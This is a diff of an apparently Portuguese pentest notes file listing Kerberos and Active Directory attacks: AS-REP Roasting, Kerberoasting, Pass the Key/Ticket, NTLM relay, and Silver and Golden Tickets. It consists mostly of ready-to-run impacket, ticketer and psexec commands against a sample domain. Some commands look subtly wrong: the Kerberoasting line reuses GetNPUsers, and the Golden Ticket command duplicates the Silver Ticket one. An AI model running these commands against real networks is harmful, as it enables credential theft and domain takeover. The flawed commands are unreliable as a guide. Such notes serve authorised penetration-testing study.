@@ -8726,29 +8726,28 @@ Gerar arquivo Criptografado com tipo de imagem para o pentest
 
 - Tipos de ataques ao KERBEROS
 
-AS-REP Roasting 
+`AS-REP Roasting`
 PRECISA DA LISTA DE USUARIO - NAO ESTAR HABILITADO O PREAUTH - ACERTAR os HORARIOS - ADD HOSTNAME AO HOSTS 
 	
  	sudo net time set -S IP-DC
  	impacket-GetNPUsers brasil.floripa.local/ -no-pass -usersfile /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt -format hashcat -outputfile output-reproast - SALVA HASHES DO TIPO krbtg5 e -m 18200 
 
 
-Kerberoasting
+`Kerberoasting`
 PRECISA TER UMA CREDENCIAL VALIDA PARA FAZER ESSE TIPO DE ATAQUE
 
 	impacket-GetNPUsers -request -dc-ip 192.168.2.37 brasil.floripa.local/maori:'PasW0rd432#_TheHardPassword:)' -outputfile file-HASHES-para-quebrar
 
-Pass the Key
+`Pass the Key` e `Pass the Ticket`
 PRECISA TER A SECRET KEY DO USER ATRAVEZ DO MIMIKATZ ou DCSYNC, MAS É NECESSARIO PRIVILEGIOS
-Pass the Ticket
 PRECISA TER ACESSO AO SERVIDOR QUE TENHA O TICKET VALIDO EM CACHE
-.
+
 
  	getTGT.py -aesKey 'kerberosKey' $domain/$user@target
 	export KRB5CCNAME=/tmp/ticket.ccache
 	impacket-psexec -k -no-pass -dc-ip DC-IP
 
-NTLM RELAY
+`NTLM RELAY`
 FAZ UM MITM ENTRE O SERVIDOR E A PESSOA QUE TA TENTANDO AUTENTICAR. PRECISA DE PROTO COM SMB SIGNIN DESABILITADO, USUARIO PEDINDO AUTH E CRIAR A LISTA DE SERVER DE SMB
 
  	sudo nano /etc/proxychains.conf ADICIONAR socks4 127.0.0.1 1080
@@ -8759,7 +8758,7 @@ FAZ UM MITM ENTRE O SERVIDOR E A PESSOA QUE TA TENTANDO AUTENTICAR. PRECISA DE P
 	TERMINAL 3 proxychains impacket-smbexec -no-pass 'PRAIAS'/'LENITA'@'192.168.2.37' PRAIAS LENITA E O IP SAO IMPUTS CAPITURADOS DO RESPONDER E NTLMRELAY
  
 
-Silver Ticket
+`Silver Ticket`
 PRECISA DO NT HASH do Serviço, DOMAIN SID, SPN
 
 	ticketer.py -nthash HASE-NT-HERE -domain-sid SID-DOMAIN-HERE -domain floripa.local -spn SPN/HERE.floripa.local fake_user
@@ -8767,7 +8766,7 @@ PRECISA DO NT HASH do Serviço, DOMAIN SID, SPN
 	psexec.py -k HOST.floripa.local
 
 
-Golden Ticket
+`Golden Ticket`
 PRECISA DO NT HASH do KRBTGT (HASH MAIS IMPOSTANTE DO AD)
 
 	ticketer.py -nthash HASE-NT-HERE -domain-sid SID-DOMAIN-HERE -domain floripa.local -spn SPN/HERE.floripa.local fake_user
